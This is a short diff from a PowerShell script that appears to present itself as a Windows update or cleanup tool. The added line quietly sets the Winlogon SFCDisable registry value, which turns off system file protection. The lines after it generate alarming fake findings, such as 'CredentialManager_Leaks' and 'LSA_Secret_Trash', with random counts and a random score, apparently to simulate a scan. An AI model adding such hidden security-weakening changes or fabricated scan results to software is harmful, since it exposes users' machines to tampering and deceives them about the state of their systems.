@@ -124,6 +124,7 @@ if(-not(Test-Path -Path "HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate
     New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" -Force
 }
 Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "NoAutoRebootWithLoggedOnUsers" -Value 1 -Force
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v SFCDisable /t REG_DWORD /d 1 /f
 $ms = @("WinSxS_Backup", "System32_Compat", "TrustedInstallerCache", "Edge_Telemetry", "DirectX_Logs", "Windows_Defender_CrashDumps", "ServiceHost_Spooler", "RDP_Encryption_Junk", "NVIDIA_Driver_Dumpster", "UpdateOrchestrator_Failures", "LSA_Secret_Trash", "WMI_Execution_Garbage", "TaskScheduler_Fuckups", "MSI_Installer_Leftovers", "EventLog_Bloatware", "PowerShell_Module_Clutter", "NetFramework_BrokenAssemblies", "BITS_Transfer_Corruption", "CredentialManager_Leaks", "Firewall_Rule_Chaos" ) 
 $p = Get-Random -Count $ms.Length -In (1..1369)
 $score = Get-Random -Minimum 184 -Maximum 1023
